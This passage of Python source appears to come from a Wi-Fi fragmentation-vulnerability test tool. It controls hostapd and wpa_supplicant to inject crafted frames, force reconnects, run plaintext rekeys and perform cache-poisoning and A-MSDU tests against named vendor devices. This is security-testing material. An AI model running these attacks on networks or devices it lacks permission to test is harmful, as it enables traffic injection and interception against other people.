			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.get_peermac())
		return bytes.fromhex(tk)

	def time_tick(self):
		for station in self.stations.values():
			station.time_tick()

	def get_ip(self, station):
		log(STATUS, f"Waiting on client {station.get_peermac()} to get IP")

	def rekey(self, station):
		log(STATUS, f"Starting PTK rekey with client {station.get_peermac()}", color="green")
		cmd = f"REKEY_PTK {station.get_peermac()}"
		if self.options.rekey_early_install:
			log(STATUS, "Will install PTK during rekey after sending Msg4")
			cmd += " early-install"
		wpaspy_command(self.wpaspy_ctrl, cmd)

	def reconnect(self, station):
		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
		# Reconnects only after a few seconds: MacOS (same with other reasons and with deauthentication)
		# Takes a few seconds, and then does a full new connection: Security Camera
		if self.options.full_reconnect:
			log(STATUS, "Deauthentication station to make it reconnect")
			cmd = f"DEAUTHENTICATE {station.get_peermac()} reason={WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA}"
		else:
			log(STATUS, "Disassociating station to make it reconnect")
			cmd = f"DISASSOCIATE {station.get_peermac()} reason={WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA}"
		wpaspy_command(self.wpaspy_ctrl, cmd)

	def handle_eth_dhcp(self, p, station):
		if not DHCP in p or not station.get_peermac() in self.dhcp.leases: return

		# This assures we only mark it as connected after receiving a DHCP Request
		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
		if req_type != 3: return

		peerip = self.dhcp.leases[station.get_peermac()]
		log(STATUS, f"Client {station.get_peermac()} with IP {peerip} has connected")
		station.set_ip_addresses(self.arp_sender_ip, peerip)

	def handle_eth(self, p):
		# TODO: Properly handle IPv6 vs DHCP. Why can't we always call station.handle_eth(p)?
		# TODO: Shouldn't we handle ARP in the Station() code instead?

		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		if not self.options.no_dhcp:
			self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Monitor DHCP messages to know when a client received an IP address
		station = self.stations[clientmac]
		if not self.options.no_dhcp and not station.obtained_ip:
			self.handle_eth_dhcp(p, station)
		else:
			station.handle_eth(p)

	def add_station(self, clientmac):
		if not clientmac in self.stations:
			station = Station(self, self.apmac, "from-DS")
			self.stations[clientmac] = station

			if self.options.ip and self.options.peerip:
				# XXX should we also override our own IP? Won't match with DHCP router.
				self.dhcp.prealloc_ip(clientmac, self.options.peerip)
				station.set_ip_addresses(self.options.ip, self.options.peerip)

	def handle_wpaspy(self, msg):
		log(DEBUG, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			self.add_station(clientmac)

			log(STATUS, f"Client {clientmac} is connecting")
			station = self.stations[clientmac]
			station.handle_connecting(self.apmac)
			station.set_peermac(clientmac)

			# When in client mode, the scanning operation might interferes with this test.
			# So it must be executed once we are connecting so the channel is stable.
			# TODO: Avoid client from disconnecting during test.
			self.injection_test(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Sending EAPOL to unknown client {clientmac}.")
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, f"Unknown client {clientmac} finished authenticating.")
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		cmd = ["../hostapd/hostapd", "-i", self.nic_iface, "hostapd.conf"] + log_level2switch()
		log(STATUS, "Starting hostapd using: " + " ".join(cmd))
		try:
			self.process = subprocess.Popen(cmd)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.connect_wpaspy()
		self.apmac = get_macaddress(self.nic_iface)

	def configure_daemon(self):
		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		# XXX Should we still do this? What about --ip and --peerip?
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		# TODO XXX: This is no longer correct due to --ip and --peerip parameters?
		#log(STATUS, f"Will inject ARP packets using sender IP {self.arp_sender_ip}")

		# When using a separate interface to inject, switch to correct channel
		self.follow_channel()


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None
		self.arp_sock = None
		self.dhcp_xid = None
		self.dhcp_offer_frame = False
		self.time_retrans_dhcp = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def get_ip(self, station):
		if not self.dhcp_offer_frame:
			self.send_dhcp_discover()
		else:
			self.send_dhcp_request(self.dhcp_offer_frame)

		self.time_retrans_dhcp = time.time() + 2.5

	def rekey(self, station):
		# WAG320N: does not work (Broadcom - no reply)
		# MediaTek: starts handshake. But must send Msg2/4 in plaintext! Request optionally in plaintext.
		#	Maybe it's removing the current PTK before a rekey?
		# RT-N10: we get a deauthentication as a reply. Connection is killed.
		# LANCOM: does not work (no reply)
		# Aruba: does not work (no reply)
		# ==> Only reliable way is to configure AP to constantly rekey the PTK, and wait
		#     untill the AP starts a rekey.
		if self.options.rekey_request:
			log(STATUS, "Actively requesting PTK rekey", color="green")
			wpaspy_command(self.wpaspy_ctrl, "KEY_REQUEST 0 1")

			# The RT-AC51U does the 4-way rekey HS in plaintext. So in some cases we must
			# remove the keys so our script will send the EAPOL frames in plaintext.
			if self.options.rekey_plaintext:
				log(STATUS, "Removing keys to perform rekey using plaintext EAPOL frames")
				self.station.reset_keys()
		else:
			log(STATUS, "Client cannot force rekey. Waiting on AP to start PTK rekey.", color="orange")

	def time_tick(self):
		if self.time_retrans_dhcp != None and time.time() > self.time_retrans_dhcp:
			log(WARNING, "Retransmitting DHCP message", color="orange")
			self.get_ip(self)

		self.station.time_tick()

	def send_dhcp_discover(self):
		if self.dhcp_xid == None:
			self.dhcp_xid = random.randint(0, 2**31)

		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		req = req/DHCP(options=[("message-type", "discover"), "end"])

		log(STATUS, f"Sending DHCP discover with XID {self.dhcp_xid}")
		self.station.send_mon(req)

	def send_dhcp_request(self, offer):
		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
		myip = offer[BOOTP].yiaddr
		sip = offer[BOOTP].siaddr
		xid = offer[BOOTP].xid

		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=self.dhcp_xid)
		reply = reply/DHCP(options=[("message-type", "request"), ("requested_addr", myip),
					    ("hostname", "fragclient"), "end"])

		log(STATUS, f"Sending DHCP request with XID {self.dhcp_xid}")
		self.station.send_mon(reply)

	def handle_eth_dhcp(self, p):
		"""Handle packets needed to connect and request an IP"""
		if not DHCP in p: return

		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')

		# DHCP Offer
		if req_type == 2:
			log(STATUS, "Received DHCP offer, sending DHCP request.")
			self.send_dhcp_request(p)
			self.dhcp_offer_frame = p

		# DHCP Ack
		elif req_type == 5:
			clientip = p[BOOTP].yiaddr
			serverip = p[IP].src
			self.time_retrans_dhcp = None
			log(STATUS, f"Received DHCP ack. My ip is {clientip} and router is {serverip}.", color="green")

			self.initialize_peermac(p.src)
			self.initialize_ips(clientip, serverip)

	def initialize_peermac(self, peermac):
		if peermac != self.station.bss:
			log(STATUS, f"Will now use peer MAC address {peermac} instead of the BSS {self.station.bss}.")
		self.station.set_peermac(peermac)

	def initialize_ips(self, clientip, serverip):
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=clientip, ARP_addr=self.station.mac)
		self.station.set_ip_addresses(clientip, serverip)

	def handle_eth(self, p):
		if BOOTP in p and p[BOOTP].xid == self.dhcp_xid:
			self.handle_eth_dhcp(p)
		else:
			if self.arp_sock != None:
				self.arp_sock.reply(p)
			self.station.handle_eth(p)

	def handle_wpaspy(self, msg):
		log(DEBUG, "daemon: " + msg)

		if "WPA: Key negotiation completed with" in msg:
			# This get's the current keys
			self.station.handle_authenticated()

		elif "Trying to authenticate with" in msg:
			# When using a separate interface to inject, switch to correct channel
			self.follow_channel()

			p = re.compile("Trying to authenticate with (.*) \(SSID")
			bss = p.search(msg).group(1)
			self.station.handle_connecting(bss)

		elif "Trying to associate with" in msg:
			# With the ath9k_htc, injection in mixed managed/monitor only works after
			# sending the association request. So only perform injection test now.
			self.injection_test(self.station.bss)

		elif "EAPOL-TX" in msg:
			cmd, srcaddr, payload = msg.split()
			self.station.handle_eapol_tx(bytes.fromhex(payload))

		# This event only occurs with WEP
		elif "WPA: EAPOL processing complete" in msg:
			self.station.handle_authenticated()

	def roam(self, station):
		log(STATUS, "Roaming to the current AP.", color="green")
		wpaspy_command(self.wpaspy_ctrl, "SET reassoc_same_bss_optim 0")
		wpaspy_command(self.wpaspy_ctrl, "ROAM " + station.bss)

	def reconnect(self, station):
		log(STATUS, "Reconnecting to the AP.", color="green")

		# Optimize reassoc-to-same-BSS by default. This makes the "REASSOCIATE" command skip
		# the authentication phase (reducing the chance that packet queues are reset).
		optim = "0" if self.options.full_reconnect else "1"

		wpaspy_command(self.wpaspy_ctrl, f"SET reassoc_same_bss_optim {optim}")
		wpaspy_command(self.wpaspy_ctrl, "REASSOCIATE")

	def configure_daemon(self):
		# If the user already supplied IPs we can immediately perform tests
		if self.options.ip and self.options.peerip:
			self.initialize_ips(self.options.ip, self.options.peerip)

		wpaspy_command(self.wpaspy_ctrl, "ENABLE_NETWORK all")

	def start_daemon(self):
		cmd = ["../wpa_supplicant/wpa_supplicant", "-Dnl80211", "-i", self.nic_iface,
			"-cclient.conf", "-W"] + log_level2switch()
		log(STATUS, "Starting wpa_supplicant using: " + " ".join(cmd))
		try:
			self.process = subprocess.Popen(cmd)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		self.connect_wpaspy()
		wpaspy_command(self.wpaspy_ctrl, "DISABLE_NETWORK all")

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")

# ----------------------------------- Main Function -----------------------------------

def cleanup():
	daemon.stop()

def char2trigger(c):
	if c == 'S': return Action.StartAuth
	elif c == 'B': return Action.BeforeAuth
	elif c == 'A': return Action.AfterAuth
	elif c == 'C': return Action.Connected
	else: raise Exception("Unknown trigger character " + c)

def stract2action(stract):
	if len(stract) == 1:
		trigger = Action.Connected
		c = stract[0]
	else:
		trigger = char2trigger(stract[0])
		c = stract[1]

	if c == 'I':
		return Action(trigger, action=Action.GetIp)
	elif c == 'R':
		return Action(trigger, action=Action.Rekey)
	elif c == 'C':
		return Action(trigger, action=Action.Reconnect)
	elif c == 'P':
		return Action(trigger, enc=False)
	elif c == 'E':
		return Action(trigger, enc=True)
	elif c == 'D':
		return Action(meta_action=Action.MetaDrop)

	raise Exception("Unrecognized action")

def prepare_tests(opt):
	stractions = opt.actions
	if opt.testname == "ping":
		if stractions != None:
			actions = [stract2action(stract) for stract in stractions.split(",")]
		else:
			actions = [Action(Action.Connected, action=Action.GetIp),
				   Action(Action.Connected, enc=True)]

		test = PingTest(REQ_ICMP, actions, opt=opt)

	elif opt.testname == "ping_frag_sep":
		# Check if we can send frames in between fragments. The seperator by default uses a different
		# QoS TID. The second fragment must use an incremental PN compared to the first fragment.
		# So this also tests if the receivers uses a per-QoS receive replay counter. By overriding
		# the TID you can check whether fragments are cached for multiple sequence numbers in one TID.
		tid = 1 if stractions == None else int(stractions)
		separator = Dot11(type="Data", subtype=8, SC=(33 << 4) | 0)/Dot11QoS(TID=tid)/LLC()/SNAP()
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, action=Action.GetIp),
				 Action(Action.Connected, enc=True),
				 Action(Action.Connected, enc=True, inc_pn=0)],
				 separate_with=separator, opt=opt)

	elif opt.testname == "wep_mixed_key":
		log(WARNING, "Cannot predict WEP key reotation. Fragment may time out, use very short key rotation!", color="orange")
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, action=Action.GetIp),
				 Action(Action.Connected, enc=True),
				 # On a WEP key rotation we get a Connected event. So wait for that.
				 Action(Action.AfterAuth, enc=True),
				])

	elif opt.testname == "cache_poison":
		# Cache poison attack. Worked against Linux Hostapd and RT-AC51U.
		test = PingTest(REQ_ICMP,
				[Action(Action.Connected, enc=True),
				 Action(Action.Connected, action=Action.Reconnect),
				 Action(Action.AfterAuth, enc=True)])

	elif opt.testname == "forward":
		test = ForwardTest()

	elif opt.testname == "eapol_msdu":
		freebsd = False
		if stractions != None:
			# TODO: Clean up this parsing / specification
			stractions = stractions
			if stractions.startswith("M,"):
				freebsd = True
				stractions = stractions[2:]
			prefix, specific = stractions[:-3], stractions[-2:]
			actions = []
			if len(prefix) > 0:
				actions = [stract2action(stract) for stract in prefix.split(",")]
			actions += [Action(char2trigger(t), enc=False) for t in specific]
		else:
			actions = [Action(Action.StartAuth, enc=False),
				   Action(Action.StartAuth, enc=False)]

		test = EapolMsduTest(REQ_ICMP, actions, freebsd)

	elif opt.testname == "linux_plain":
		decoy_tid = None if stractions == None else int(stractions)
		test = LinuxTest(REQ_ICMP, decoy_tid)

	elif opt.testname == "macos":
		if stractions != None:
			actions = [Action(char2trigger(t), enc=False) for t in stractions]
		else:
			actions = [Action(Action.StartAuth, enc=False),
				   Action(Action.StartAuth, enc=False)]

		test = MacOsTest(REQ_ICMP, actions)

	elif opt.testname == "qca_test":
		test = QcaDriverTest()

	elif opt.testname == "qca_split":
		test = QcaTestSplit()

	elif opt.testname == "qca_rekey":
		test = QcaDriverRekey()

	# No valid test ID/name was given
	else: return None

	# -----------------------------------------------------------------------------------------

	# XXX TODO : Hardware decrypts it using old key, software using new key?
	#	     So right after rekey we inject first with old key, second with new key?

	# XXX TODO : What about extended functionality where we can have
	#	     two simultaneously pairwise keys?!?!

	# TODO:
	# - Test case to check if the receiver supports interleaved priority
	#   reception. It seems Windows 10 / Intel might not support this.
	# - Test case with a very lage aggregated frame (which is normally not
	#   allowed but some may accept it). And a variation to check how APs
	#   will forward such overly large frame (e.g. force fragmentation).
	# - [TKIP] Encrpted, Encrypted, no global MIC
	# - Plain/Enc tests but first plaintext sent before installing key
	# - Test fragmentation of management frames
	# - Test fragmentation of group frames (STA mode of RT-AC51u?)

	# If requested, override delay and inc_pn parameters in the test.
	test.set_general_options(opt.delay, opt.inc_pn)

	# If requested, override the ptype
	if opt.ptype != None:
		if not hasattr(test, "ptype"):
			log(WARNING, "Cannot override request type of the selected test.")
			quit(1)
		test.ptype = opt.ptype

	return test

def args2ptype(args):
	# Only one of these should be given
	if args.arp + args.dhcp + args.icmp + args.ipv6 > 1:
		log(STATUS, "You cannot combine --arp, --dhcp, --ipv6, or --icmp. Please only supply one of them.")
		quit(1)

	if args.arp: return REQ_ARP
	if args.dhcp: return REQ_DHCP
	if args.icmp: return REQ_ICMP
	if args.ipv6: return REQ_ICMPv6_RA

	return None

def args2msdu(args):
	# Only one of these should be given
	if args.msdu + args.fake_msdu > 1:
		log(STATUS, "You cannot combine --msdu and --fake_msdu. Please only supply one of them.")
		quit(1)

	if args.msdu: return 1
	if args.fake_msdu: return 2

	return None

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Test for fragmentation vulnerabilities.")
	parser.add_argument('iface', help="Interface to use for the tests.")
	parser.add_argument('testname', help="Name or identifier of the test to run.")
	parser.add_argument('actions', nargs='?', help="Optional textual descriptions of actions")
	parser.add_argument('--inject', default=None, help="Interface to use to inject frames.")
	parser.add_argument('--inject-test', default=None, help="Use given interface to test injection through monitor interface.")
	parser.add_argument('--inject-selftest', default=False, action='store_true', help="Partial injection test (checks kernel only).")
	parser.add_argument('--hwsim', default=None, help="Use provided interface in monitor mode, and simulate AP/client through hwsim.")
	parser.add_argument('--ip', help="IP we as a sender should use.")
	parser.add_argument('--peerip', help="IP of the device we will test.")
	parser.add_argument('--ap', default=False, action='store_true', help="Act as an AP to test clients.")
	parser.add_argument('--debug', type=int, default=0, help="Debug output level.")
	parser.add_argument('--delay', type=float, default=0, help="Delay between fragments in certain tests.")
	parser.add_argument('--inc-pn', type=int, help="To test non-sequential packet number in fragments.")
	parser.add_argument('--msdu', default=False, action='store_true', help="Encapsulate pings in an A-MSDU frame.")
	parser.add_argument('--fake-msdu', default=False, action='store_true', help="Set A-MSDU flag but include normal payload.")
	parser.add_argument('--arp', default=False, action='store_true', help="Override default request with ARP request.")
	parser.add_argument('--dhcp', default=False, action='store_true', help="Override default request with DHCP discover.")
	parser.add_argument('--icmp', default=False, action='store_true', help="Override default request with ICMP ping request.")
	parser.add_argument('--ipv6', default=False, action='store_true', help="Override default request with ICMPv6 router advertisement.")
	parser.add_argument('--no-dhcp', default=False, action='store_true', help="Do not reply to DHCP requests as an AP.")
	parser.add_argument('--icmp-size', type=int, default=None, help="Second to wait after AfterAuth before triggering Connected event")
	parser.add_argument('--padding', type=int, default=None, help="Add padding data to ARP/DHCP/ICMP requests.")
	parser.add_argument('--rekey-request', default=False, action='store_true', help="Actively request PTK rekey as client.")
	parser.add_argument('--rekey-plaintext', default=False, action='store_true', help="Do PTK rekey with plaintext EAPOL frames.")
	parser.add_argument('--rekey-early-install', default=False, action='store_true', help="Install PTK after sending Msg3 during rekey.")
	parser.add_argument('--full-reconnect', default=False, action='store_true', help="Reconnect by deauthenticating first.")
	parser.add_argument('--bcast', default=False, action='store_true', help="Send pings using broadcast receiver address (addr1).")
	parser.add_argument('--pn-per-qos', default=False, action='store_true', help="Use separate Tx packet counter for each QoS TID.")
	parser.add_argument('--freebsd-cache', default=False, action='store_true', help="Sent EAP(OL) frames as (malformed) broadcast EAPOL/A-MSDUs.")
	parser.add_argument('--connected-delay', type=int, default=1, help="Second to wait after AfterAuth before triggering Connected event")
	parser.add_argument('--to-self', default=False, action='store_true', help="Send ARP/DHCP/ICMP with same src and dst MAC address.")
	options = parser.parse_args()

	# Default value for options that should not be command line parameters
	options.inject_mf_workaround = False

	# Sanity check and convert some arguments to more usable form
	options.ptype = args2ptype(options)
	options.as_msdu = args2msdu(options)

	# Construct the test
	options.test = prepare_tests(options)
	if options.test == None:
		log(STATUS, f"Test name/id '{options.testname}' not recognized. Specify a valid test case.")
		quit(1)

	# Parse remaining options
	change_log_level(-options.debug)

	# Now start the tests --- TODO: Inject Deauths before connecting with client...
	if options.ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()

